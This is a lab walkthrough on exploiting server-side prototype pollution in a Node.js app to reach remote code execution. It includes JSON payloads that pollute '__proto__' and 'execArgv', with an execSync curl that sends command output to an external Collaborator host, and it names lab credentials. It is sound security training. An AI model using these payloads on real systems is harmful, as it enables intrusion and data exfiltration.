# Lab 8 - JSON Spaces

### Objective: Get RCE & Delete `/home/carlos/morale.txt`

In this lab, we already have escalated privileges, giving us access to admin functionality. We can log in to our account with the following credentials: `wiener:peter`

Inspect the request in Repeater

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Now, we will try the `json spaces` override technique. We will attempt to add the `__proto__` as an object that has the `json spaces` property. I this case I will be using `20`

```json
"__proto__":{
	"json spaces": 20
}
```

Send the request and check the Raw Response

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Great, it worked. Now in the 'Admin Panel' there is a button to Run maintenance jobs\


<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Checking the request it made on Burp reveals that its doing some system-level functions like DB and Filesystem cleanup. These are good candidates that spawn child processes that we can use to get RCE

<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

What we can do from here first pollute the `execArgv` property in the `child_process` module and call execSync to our Burp Collaborator

```json
"__proto__":{
	"execArgv":[
		"--eval=require('child_process').execSync('curl https://xvwj31prbz2zljp52qbqjulgg7myapye.oastify.com -d $(id)')"
	]
}
```

In the command above, I use the `-d` flag to send data which is the bash command I want to execute, `id`

<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Send the request and Run maintenance jobs to spawn another child process that executes our payload

Check the Collaborator tab for incoming polls

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

And there it is, we received output from our payload. RCE successful! Now, just delete `/home/carlos/morale.txt` and we solved the lab!
